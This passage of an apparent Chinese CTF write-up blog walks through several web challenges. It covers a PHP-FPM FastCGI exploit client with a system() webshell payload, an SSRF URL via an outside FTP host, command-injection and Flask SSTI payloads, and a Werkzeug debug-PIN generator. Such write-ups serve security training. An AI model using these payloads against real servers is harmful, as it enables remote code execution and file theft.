class="built_in">self</span>::GET_VALUES, $request, <span class="number">0</span>));</span><br><span class="line">        $resp = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> ($resp[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair($resp[<span class="string">&#x27;content&#x27;</span>], $resp[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> $params, $stdin</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        $request = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        $paramsRequest = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= <span class="keyword">$this</span>-&gt;buildNvpair($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($paramsRequest) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, $paramsRequest);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($stdin) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, $stdin);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span>.urlencode($request));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">$filepath = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;    <span class="comment">// 目标主机已知的PHP文件的路径</span></span><br><span class="line">$req = <span class="string">&#x27;/&#x27;</span>.basename($filepath);</span><br><span class="line">$uri = $req .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;    <span class="comment">// 啥也不是, 不用管</span></span><br><span class="line">$client = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">$code = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;    <span class="comment">// 啥也不是, 不用管</span></span><br><span class="line">$php_value = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;</span><br><span class="line">$params = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; $filepath,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; $req,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; $uri,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; $req,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; $php_value,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen($code)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> $client-&gt;request($params, $code).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hack.php?file&#x3D;ftp:&#x2F;&#x2F;81.69.201.65:2000&#x2F;&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure>



<p>然后我又弹不出来shell了？？？</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>PHP特性</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF_EasyByPass</title>
    <url>/2021/05/12/BUUCTF-EasyByPass/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>闭合括号</p>
<p>题目放出源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$comm1 = $_GET[<span class="string">&#x27;comm1&#x27;</span>];</span><br><span class="line">$comm2 = $_GET[<span class="string">&#x27;comm2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, $comm1))</span><br><span class="line">    $comm1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, $comm2))</span><br><span class="line">    $comm2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$flag = <span class="string">&quot;#flag in /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">$comm1 = <span class="string">&#x27;&quot;&#x27;</span> . $comm1 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$comm2 = <span class="string">&#x27;&quot;&#x27;</span> . $comm2 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">var_dump($comm1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$cmd = <span class="string">&quot;file <span class="subst">$comm1</span> <span class="subst">$comm2</span>&quot;</span>;</span><br><span class="line">var_dump($cmd);</span><br><span class="line">system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>本地测试一下，随便测了一下。。打，过了</p>
<p><img src="BUUCTF_EasyByPass/image-20210512202222508.png" alt="image-20210512202222508"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.32.131&#x2F;1.php?comm1&#x3D;&quot;;tac &#x2F;*;&quot;&amp;comm2&#x3D;1</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020FlaskApp</title>
    <url>/2021/05/13/GYCTF2020FlaskApp/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
<li>Flask DEbug模式</li>
<li>SSTI</li>
</ul>
<h1 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h1><p><img src="GYCTF2020FlaskApp/image-20210513224517992.png" alt="image-20210513224517992"></p>
<p>复现的，主要是需要利用SSTI获取如下信息：</p>
<ul>
<li><p> cat /etc/passwd 下的当前用户名</p>
</li>
<li><p>modname 一般默认为flask.app</p>
</li>
<li><pre><code class="python">getattr(app, “__name__”, app.__class__.__name__)。python该值一般为Flask 值一般不变
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ flask库下面的app.py 的绝对路径，一般报错信息就泄露了</span><br><span class="line"></span><br><span class="line">+ 当前网络的mac地址的十进制，读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 即可得到</span><br><span class="line"></span><br><span class="line">  利用python转换成十进制</span><br><span class="line"></span><br><span class="line">  ![image-20210513224832045](GYCTF2020FlaskApp&#x2F;image-20210513224832045.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">机器的ID： 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。</span><br><span class="line"></span><br><span class="line">对于docker机则读取读取&#x2F;proc&#x2F;self&#x2F;cgroup获取get_machine_id()(docker后面那段字符串)：</span><br><span class="line"></span><br><span class="line">EXP,抓过来，打</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits &#x3D; [</span><br><span class="line">    &#39;flaskweb&#39;# username</span><br><span class="line">    &#39;flask.app&#39;,# modname</span><br><span class="line">    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span><br><span class="line">    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits &#x3D; [</span><br><span class="line">    &#39;2485377871076&#39;,# str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</span><br><span class="line">    &#39;bad1f6f0683c071acc834769dff047e264024e2f37e2cb6fb1e77c550c4eb15a&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h &#x3D; hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit &#x3D; bit.encode(&#39;utf-8&#39;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#39;cookiesalt&#39;)</span><br><span class="line"></span><br><span class="line">cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num &#x3D; None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#39;pinsalt&#39;)</span><br><span class="line">    num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv &#x3D;None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size &#x3D;&#x3D; 0:</span><br><span class="line">            rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv &#x3D; num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>




</code></pre>
</li>
</ul>
<h1 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h1><p>我自己做的时候我是直接非预期了，作者的过滤不是很严格导致我直接绕过了</p>
<h2 id="ssti-挨个整过去"><a href="#ssti-挨个整过去" class="headerlink" title="ssti 挨个整过去"></a>ssti 挨个整过去</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;po&#39;+&#39;pen&#39;](&#39;cat &#x2F;this_is_the_fl[a&#123;1&#125;]g.txt&#39;).read()&#125;&#125;  </span><br></pre></td></tr></table></figure>

<p>题目是过滤了如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span> black_list = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;chr&quot;</span>, <span class="string">&quot;request&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;commands&quot;</span>, <span class="string">&quot;socket&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>]</span><br></pre></td></tr></table></figure>



<p>过滤了? 和 * 号但是没有过滤中括号，要知道，在linux当中是允许使用正则表达式读取文件的,利用这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;songgj&#x2F;p&#x2F;8906005.html</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>HarezeEasyNotes</title>
    <url>/2021/05/14/HarezeEasyNotes/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
<li>session 反序列化</li>
<li>代码审计</li>
</ul>
<h1 id="做题思路："><a href="#做题思路：" class="headerlink" title="做题思路："></a>做题思路：</h1><p>题目是给出源码的，比较关键的代码在这里：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_save_path(TEMP_DIR);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>



<p>我们需要明白PHP的session储存机制，当PHP储存session的时候，会序列化我们的代码，并且将其保存为sess_xxxxx类型的文件</p>
<p><img src="HarezeEasyNotes/image-20210514173153776.png" alt="image-20210514173153776"></p>
<p>就比如这里的值，实际上就是由php读取了sess__29af5bb579395528cbc4b72153afb10b 文件得来，这时php就会读取其中的值了。如果我们需要伪造的话我们需要知道路径</p>
<p>根据init.php我们得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_save_path(TEMP_DIR);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>又可知道：</p>
<p><img src="HarezeEasyNotes/image-20210514173413851.png" alt="image-20210514173413851"></p>
<p>下载代码会读取文件，而文件名是根据user名字来控制的吗，而后面的内容名字说是随机的，其实到厦门看可以发现还是会读取当前文件夹下的文件- -？</p>
<p>而读写的内容通过·add_note函数可以控制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_note</span>(<span class="params">$title, $body</span>) </span>&#123;</span><br><span class="line">  $notes = get_notes();</span><br><span class="line">  array_push($notes, [</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span> =&gt; $title,</span><br><span class="line">    <span class="string">&#x27;body&#x27;</span> =&gt; $body,</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span> =&gt; hash(<span class="string">&#x27;sha256&#x27;</span>, microtime())</span><br><span class="line">  ]);</span><br><span class="line">  $_SESSION[<span class="string">&#x27;notes&#x27;</span>] = $notes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>写入内容为</p>
<p>xxxx|N;admin|b:1;xxxxxx</p>
<p>访问export.php type=. 这样子就完全控制了文件名</p>
<p>下载过来的文件名后面就是session，访问flag即可</p>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeGame</title>
    <url>/2021/05/13/NodeGame/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
<li><p>CRLF 头部注入</p>
</li>
<li><p>SSRF</p>
</li>
<li><p>PUG 文件执行</p>
</li>
</ul>
<p>思路：</p>
<p>题目是给出源码的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">&#x27;./dist&#x27;</span>&#125;).array(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">app.use(morgan(<span class="string">&#x27;short&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/uploads&#x27;</span>)))</span><br><span class="line">app.use(<span class="string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/template&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">&quot;index&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">&quot;/&quot;</span>) || action.includes(<span class="string">&quot;\\&quot;</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">&#x27;/template/&#x27;</span>+ action +<span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">            obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">&quot;/&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">!fs.existsSync(__dirname + file_path)</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">&#x27;upload success&#x27;</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">&#x27;/template/source.txt&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/core&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span 